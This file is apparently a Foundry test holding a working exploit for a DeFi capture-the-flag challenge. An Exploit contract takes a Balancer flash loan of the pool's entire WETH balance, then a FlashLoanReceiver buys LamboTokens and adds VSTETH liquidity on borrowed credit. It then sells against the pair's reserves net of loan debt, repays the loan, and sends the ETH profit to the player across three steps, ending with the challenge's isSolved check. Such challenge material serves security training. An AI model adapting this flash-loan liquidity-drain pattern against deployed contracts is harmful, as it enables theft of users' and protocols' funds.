pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/core/Setup.sol";
import "src/core/Factory.sol";
import "src/core/LamboToken.sol";
import "src/core/WETH.sol";
import "src/core/VasthavikamainaToken.sol";
import {Balancer} from "src/core/Balancer.sol";
import {IFlashLoanRecipient} from "src/core/Balancer.sol";
import {SetConditions} from "script/Deploy.s.sol";
import {IUniswapV2Pair} from "src/uniswap-v2/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "src/uniswap-v2/interfaces/IUniswapV2Factory.sol";




contract Exploit{
    Setup public setup;
    Factory public factory;
    WETH9 public wETH9;
    Balancer public balancer;
    FlashLoanReceiver flashLoanReceiver;
    address player;
    constructor(address _setup,address _player){
        setup=Setup(_setup);
        wETH9=setup.wETH9();
        balancer=setup.balancer();
        player=_player;
        flashLoanReceiver=new FlashLoanReceiver(setup,player);
    }

    function pwn()public{
       IERC20[] memory _tokens=new IERC20[](1);
       uint256[] memory _amounts=new uint256[](1);
       bytes memory _data;
       _tokens[0]=IERC20(address(wETH9));
       _amounts[0]=wETH9.balanceOf(address(balancer));
       balancer.flashloan(IFlashLoanRecipient(address(flashLoanReceiver)), _tokens, _amounts, _data);
        
    }
}


contract FlashLoanReceiver is IFlashLoanRecipient {
    Setup public setup;
    VasthavikamainaToken public VSTETH;
    IUniswapV2Factory public uniswapV2Factory;
    WhiteListed public whiteListed;
    Factory public factory;
    WETH9 public wETH9;
    Balancer public balancer;
    IUniswapV2Pair public uniPair1;
    IUniswapV2Pair public uniPair2;
    IUniswapV2Pair public uniPair3;
    LamboToken public lamboToken1;
    LamboToken public lamboToken2;
    LamboToken public lamboToken3;
    uint8 state;
    address player;
    constructor(Setup _setup,address _player){
        setup=_setup;
        VSTETH=setup.VSTETH();
        uniswapV2Factory=setup.uniswapV2Factory();
        whiteListed=setup.whilteListed();
        factory=setup.factory();
        wETH9=setup.wETH9();
        balancer=setup.balancer();
        uniPair1=setup.uniPair1();
        uniPair2=setup.uniPair2();
        uniPair3=setup.uniPair3();
        lamboToken1=setup.lamboToken1();
        lamboToken2=setup.lamboToken2();
        lamboToken3=setup.lamboToken3();
        player=_player;

    }



    function getAmountsIn(uint256 amountOut,uint256 reserveIn,uint256 reserveOut)internal pure returns(uint256 amountIn){
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint256 numerator= reserveIn*amountOut*1000;
        uint256 denominator= (reserveOut-amountOut)*997;
        amountIn=numerator/denominator;
    }

    function receiveFlashLoan(
        IERC20[] memory _tokens,
        uint256[] memory _amounts,
        uint256[] memory _feeAmounts,
        bytes memory _data
    ) external override {
        LamboToken lamboToken;
        IUniswapV2Pair uniPair;
        if(state==uint8(0)){
            state++;
            lamboToken=lamboToken1;
            uniPair=uniPair1;
            console.log("=================================================");
            console.log("                    STEP-1                       ");
        }else if(state==uint8(1)){
            state++;
            lamboToken=lamboToken2;
            uniPair=uniPair2;
            console.log("=================================================");
            console.log("                    STEP-2                       ");
        }else{
            state++;
            lamboToken=lamboToken3;
            uniPair=uniPair3;
            console.log("=================================================");
            console.log("                    STEP-3                       ");
        }
        IERC20 _token=_tokens[0];
        uint256 _amount=_amounts[0];
        wETH9.withdraw(address(this), _amount);
        uint256 _lamboOut=whiteListed.buyQuote{value:_amount}(address(lamboToken), _amount, 0);
        lamboToken.approve(address(factory), _lamboOut);
        uint256 _loanAmount=300e18;
        
        factory.addVasthavikamainaLiquidity(address(VSTETH), address(lamboToken), _loanAmount, _lamboOut);
        (uint256 _reserve0,uint256 _reserve1,)=uniPair.getReserves();
        address _token0=uniPair.token0();
        uint256 _netBalance;
        uint256 _amountIn;
        if(_token0==address(VSTETH)){
            uint256 _debtAmount=VSTETH.getLoanDebt(address(uniPair));
            _netBalance=_reserve0-_debtAmount;
            _amountIn=getAmountsIn(_netBalance, _reserve1, _reserve0);
        }else{
            uint256 _debtAmount=VSTETH.getLoanDebt(address(uniPair));
            _netBalance=_reserve1-_debtAmount;
            _amountIn=getAmountsIn(_netBalance, _reserve0, _reserve1);
        }
        lamboToken.approve(address(whiteListed), _amountIn);
        whiteListed.sellQuote(address(lamboToken), _amountIn, 0);
        wETH9.deposit{value: _amount}(address(this));
        wETH9.transfer(address(balancer), _amount);
        if(state==1){
            console.log("ETH PROFIT AFTER STEP1 :",address(this).balance);
            payable(player).transfer(address(this).balance);
        }else if (state==2){
            console.log("ETH PROFIT AFTER STEP2 :",address(this).balance);
            payable(player).transfer(address(this).balance);
        }else{
            console.log("ETH PROFIT AFTER STEP3 :",address(this).balance);
            payable(player).transfer(address(this).balance);
            console.log("TOTAL PROFIT           :",address(player).balance);
            setup.setPlayer(player);
            setup.isSolved();
            console.log(setup.isSolved());
        }
        }

    
    receive()external payable{
        
    }
}

interface IuniswapFactory{
    function getBytecode()external returns (bytes32);
}

contract TestContract is Test {
    function test_exploit() public {
        address uniswapFactory = createFactory();
        Setup setup = new Setup{value: 6.35 ether}(uniswapFactory);
        uint256 liquidityAmount = 32560203560896180352774;
        uint256 vETHBalanceTo_VETH_HBL=132534758877722247977 - (3.3 ether);
        uint256 vETHBalanceTo_VETH_CBO=5007791505809550535 - 0.05 ether;
        uint256 vETHBalanceTo_VETH_BIN=3852171628908871705- 3 ether;
        uint256 amount=liquidityAmount+vETHBalanceTo_VETH_HBL+vETHBalanceTo_VETH_CBO+vETHBalanceTo_VETH_BIN;
        WhiteListed _whiteListed=setup.whilteListed();
        Factory _factory=setup.factory();
        bytes32 _initHash=IuniswapFactory(uniswapFactory).getBytecode();
        _whiteListed.setInitHash(_initHash);
        _factory.setInitHash(_initHash);
        SetConditions _setconditions=new SetConditions{value:amount}(address(setup));
    }
    
}